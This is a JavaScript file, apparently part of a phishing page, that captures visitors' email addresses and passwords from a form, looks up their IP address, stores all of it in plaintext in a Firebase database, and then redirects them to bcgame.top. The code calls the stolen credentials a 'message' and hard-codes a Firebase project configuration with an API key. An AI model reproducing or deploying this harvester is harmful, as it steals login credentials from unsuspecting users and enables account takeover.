// Initialize Firebase (ADD YOUR OWN DATA)
const firebaseConfig = {
  apiKey: "AIzaSyDidrzsS0SuP5JPryUkS6zJ0zdur2ir0RQ",

    authDomain: "database-bc-88916.firebaseapp.com",

    projectId: "database-bc-88916",

    storageBucket: "database-bc-88916.appspot.com",

    messagingSenderId: "162620117945",

    appId: "1:162620117945:web:83e63c804c3a867b2d1c68",

    measurementId: "G-882YHRYGZ7"

      
  
    };

    firebase.initializeApp(firebaseConfig);

// Reference messages collection
var messagesRef = firebase.database().ref('user');

// Listen for form submit
document.getElementById('contactForm').addEventListener('submit', submitForm);

// Submit form
function submitForm(e){
    e.preventDefault();

    // Get values
    var password = getInputVal('password');
    var email = getInputVal('email');

    // Fetch user's IP address
    getUserIP().then(userIP => {
        // Save message with user's IP address
        saveMessage(email, password, userIP);
    }).catch(error => {
        console.error('Error fetching IP address:', error);
        // Save message without user's IP address
        saveMessage(email, password, 'Unknown');
    });

    // Show alert
    document.querySelector('.alert').style.display = 'block';

    // Hide alert after 3 seconds
    setTimeout(function(){
        document.querySelector('.alert').style.display = 'none';
    }, 5000);

    // Clear form
    document.getElementById('contactForm').reset();
}

// Function to get form values
function getInputVal(id){
    return document.getElementById(id).value;
}

// Function to fetch user's IP address
function getUserIP() {
    return fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            return data.ip;
        });
}

// Save message to Firebase
function saveMessage(email, password, userIP) {
    var newMessageRef = messagesRef.push();
    newMessageRef.set({
        email: email,
        password: password,
        userIP: userIP
    });
    // Redirect after saving the message
    setTimeout(function () {
        window.location.href = 'https://bcgame.top/'; // Change the URL to the desired redirection destination
    }, 1000);
}
  
  
